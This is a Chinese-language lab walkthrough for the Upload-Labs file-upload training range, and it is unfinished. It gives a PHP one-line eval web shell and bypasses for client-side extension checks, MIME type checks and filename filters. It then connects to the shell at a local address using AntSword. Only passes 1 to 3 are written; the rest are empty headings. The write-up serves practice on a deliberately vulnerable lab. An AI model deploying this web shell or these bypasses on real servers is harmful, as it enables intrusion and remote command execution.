# Upload-Labs靶场全解

此靶场专为文件上传漏洞而生，环境配置就不多说了，和dvwa都一样轻松配置。

靶场源码：https://github.com/c0ny1/upload-labs

实验工具包括：BP、蚁剑、010



## Pass-01

 一句话木马文件`shell.php`

```
<?php @eval($_POST['cmd'])?>
```

上传的时候做了文件类型的限制，所以直接F12修改代码就可以了。

```php
var allow_ext = ".jpg|.png|.gif|.php";
```

上传成功了，然后点击查看元素，可以发现文件上传的位置

```
../upload/shell.php
```



直接蚁剑连接

```
URL地址: http://127.0.0.1/upload/shell.php
连接密码: cmd
```



## Pass-02



抓包上传，然后显示文件类型不正确，那就说明对数据包的MIME进行检查，那就直接修改一波。



```
Content-Type: image/jpeg
```



OK，上传成功，后续蚁剑同上操作。



## Pass-03

看源码会发现，它对文件的后缀为`.asp`、`.aspx`、`.php`、`.jsp`做出了限制

```
Content-Disposition: form-data; name="upload_file"; filename="shell.php5"
```



直接抓包更改`filename="shell.jpg"`

上传成功，但是名字发生了变化，可以通过元素的查看发现更改后的名字

```
../upload/202501121448055506.jpg
```



直接蚁剑连接

```
URL地址:  
连接密码: cmd
```





## Pass-04



## Pass-05

## Pass-06

## Pass-07

## Pass-08

## Pass-09

## Pass-10

## Pass-11

## Pass-12

## Pass-13

## Pass-14

## Pass-15

## Pass-16

## Pass-17

## Pass-18

## Pass-19

## Pass-20